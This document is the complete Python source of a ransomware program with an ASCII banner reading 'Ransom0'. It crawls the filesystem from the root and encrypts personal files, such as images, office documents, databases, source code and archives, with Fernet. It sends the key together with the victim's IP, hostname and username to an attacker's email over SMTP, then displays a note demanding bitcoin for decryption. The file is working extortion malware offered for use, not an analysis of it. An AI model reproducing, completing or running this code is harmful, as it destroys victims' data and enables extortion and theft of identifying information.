import os, platform, random, smtplib, ssl, socket, shutil, subprocess
from os import system, name
from requests import get
from datetime import datetime
from progress.bar import Bar
from progress.spinner import Spinner
from cryptography.fernet import Fernet

key = Fernet.generate_key()
username = os.getlogin()
digits = random.randint(1111,9999) 
time_now = datetime.now().time()
hostname = socket.gethostname()
IP = get('https://api.ipify.org').text
PATH = os.getcwd()

# Email Settings
port = 587  
smtp_server = "" # Enter the smtp server of your email provider
sender_email = ""  # Enter your address
receiver_email = ""  # Enter receiver address
password = "" # your email password

EXCLUDE_DIRECTORY = ('/usr', #Mac/Linux system directory
                    '/Library/',
                    '/System',
                    '/Applications',
                    '.Trash',
                    #Windows system directory
                    'Program Files',
                    'Program Files (x86)',
                    'Windows',
                    '$Recycle.Bin',
                    'AppData',

)


EXTENSIONS = (
        # '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
        '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
        '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
        '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies

        '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
        '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
        '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
        '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
        
        '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
        '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
        '.java', '.class', '.jar', # java source code
        '.ps', '.bat', '.vb', '.vbs' # windows based scripts
        '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
        '.go', '.py', '.pyc', '.bf', '.coffee', # other source code files

        '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
    )


#Clear Screen Function
def clear(): 
    if name == 'nt': 
        _ = system('cls') 

    else: 
        _ = system('clear') 

def FindFiles():
    load_state = 0
    spinner = Spinner('Finding Files ')
    while load_state != 'FINISHED':
        f = open("logs/path.txt", "a")
        cnt = 0
        for root, dirs, files in os.walk("/"):
        # for root, files in os.walk("/YOUR/TESTING/DIRECTORY"):   
                for dir in dirs:
                    if any(s in root for s in EXCLUDE_DIRECTORY):
                        spinner.next()
                        pass
                    else:
                        for file in files:
                            if file.endswith(EXTENSIONS):
                                cnt += 1
                                TARGET = os.path.join(root, file)
                                f.write(TARGET+'\n')
                                spinner.next()
                                print(root)


        f.close()
        f = open("logs/cnt.txt", "w")
        f.write(str(cnt))
        f.close()
        load_state = 'FINISHED'

    print()
    print("Found {} target files".format(cnt))
    print()



def encrypt(filename):
    f = Fernet(key)
    with open(filename, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(filename, "wb") as file:
        file.write(encrypted_data)


def DISPLAY():
    print("""
    ____                                  ___  
    |  _ \ __ _ _ __  ___  ___  _ __ ___  / _ \ 
    | |_) / _` | '_ \/ __|/ _ \| '_ ` _ \| | | |
    |  _ < (_| | | | \__ \ (_) | | | | | | |_| |
    |_| \_\__,_|_| |_|___/\___/|_| |_| |_|\___/ 
                                                
    """)
    print("Time: {}".format(time_now))
    print("IP Adress: {}".format(IP))
    print("Platform: {}".format(platform.system()))
    print("Hostname: {}".format(hostname))
    print("User: {}".format(username))
    print("ID: {}".format(str(digits)))
    print()


def StartRansom():
    FindFiles()
    f = open("logs/cnt.txt", "r")
    cnt = f.read()
    f.close()
    with Bar('Encrypting', max=int(cnt)) as bar:
        filepath = 'logs/path.txt'
        with open(filepath) as fp:
            line = fp.readline()
            while line:
                filename = line.strip()
                try:
                    encrypt(filename)
                except Exception:
                    print("!Permission denied")
                    pass
                line = fp.readline()
                bar.next()
    fp.close()
    print()
    SendData()
    clear()
    DecyptMessage(False)

def decrypt(filename):
    f = open("logs/key_data.txt", "r")
    key = f.read()
    f.close()
    f = Fernet(key)
    with open(filename, "rb") as file:
        encrypted_data = file.read()
    decrypted_data = f.decrypt(encrypted_data)
    with open(filename, "wb") as file:
        file.write(decrypted_data)


def DecyptMessage(INVALID_KEY):
    clear()
    DISPLAY()
    if INVALID_KEY == True:
        print("Invalid Key !")
    else: 
        pass
    print("""
    To get the decryption key, please send 50$ in bitcoin to BITCOIN ADRESS 
    And send proof of transfer, your id and your name to  EMAIL ADRESS
    """)
    key_data = input('key: ')
    f = open("logs/key_data.txt", "w")
    f.write(key_data)
    f.close()
    with open('logs/path.txt') as fp:
        line = fp.readline()
        while line:
            filename = line.strip()
            try:
                decrypt(filename)
            except PermissionError:
                print("!Permission Denied")
                pass
            except Exception:
                DecyptMessage(True)
            line = fp.readline()
    print("Your file have been decrypted")
    fp.close()
    shutil.rmtree(PATH+'/logs', ignore_errors=True)
    exit()



def SendData():
    DataSend = ("""
    time: {}
    IP: {}
    Hostname: {}
    username: {}
    id: {}
    key: {}
    """).format(time_now, IP, hostname, username, str(digits), str(key))
    print("Sending Data")
    context = ssl.create_default_context()
    with smtplib.SMTP(smtp_server, port) as server:
        server.ehlo()  # Can be omitted
        server.starttls(context=context)
        server.ehlo()  # Can be omitted
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, DataSend)

if __name__ == '__main__':
    # Generate digits ID or read generated value from digits.txt
    if os.path.isfile("logs/digits.txt") == True:
        f = open("logs/digits.txt", "r")
        digits = f.read()
        f.close()
        DecyptMessage(False)
    else:
        os.mkdir("logs")
        f = open("logs/digits.txt", "w")
        f.write(str(digits))
        f.close()
        StartRansom()
